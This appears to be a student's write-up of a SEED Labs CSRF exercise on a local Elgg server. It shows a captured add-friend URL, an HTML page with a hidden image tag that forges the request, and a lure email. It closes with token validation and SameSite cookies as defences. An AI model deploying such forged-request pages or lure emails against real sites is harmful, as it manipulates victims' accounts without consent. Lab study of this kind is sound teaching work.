# DOTA Lab 4 Part 4

The task 3 is to make Alice add Samy as friends using CSRF by GET method.

## Instruction

Capture the GET request used to add friends, we can get the URL

```
http://www.seed-server.com/action/friends/add?friend=59
```

where 59 is the userid of Alice, obtained by the traffic of homepage.

Then, Samy needs to build a malicious website that will hijack Alice's cookies and redirct to `seed-server.com`

```html
<!Doctype html>
<html>
<head>
<title>Apache</title>
</head>
<body>
<img src="http://www.seed-server.com/action/friends/add?friend=59">
<h1>It works!</h1>
<body>
</html>
```

Finally, Samy will send the link of malicious website to trick Alice to click, triggering the CSRF attack. Send an email to Alice:

```
Title: Found an interesting website
Body:

Hi Alice,

Here's an interesting website I found about xxx, check it out!

link: http://www.attacker32.com
```

Then check Alice's friend lists. We can see Alice is Samy's Friend now.

## Prevention

We can prevent from being attacked by CSRF by enabling two-token verification.

Enter `/var/www/elgg/vendor/elgg/elgg/engine/classes/Elgg/Security` folder and edit `Csrf.php` source file. Find function `validate` and comment the first line

```
# return;
```

The countermeasures is that the tokens

```
elgg.security.token.__elgg_ts;
elgg.security.token.__elgg_token;
```

are only generated when user login and stored at the webpages instead of cookies. Thus, the friend request is valid if and only if user send it from the its homepage. Everytime the request is send, the validation checks the token.

### Other Countermeasure

We can enable the setting `SameSite Cookie` at the field of HTTP response to ensure that the brower will not give cookie to the cross-site referring.

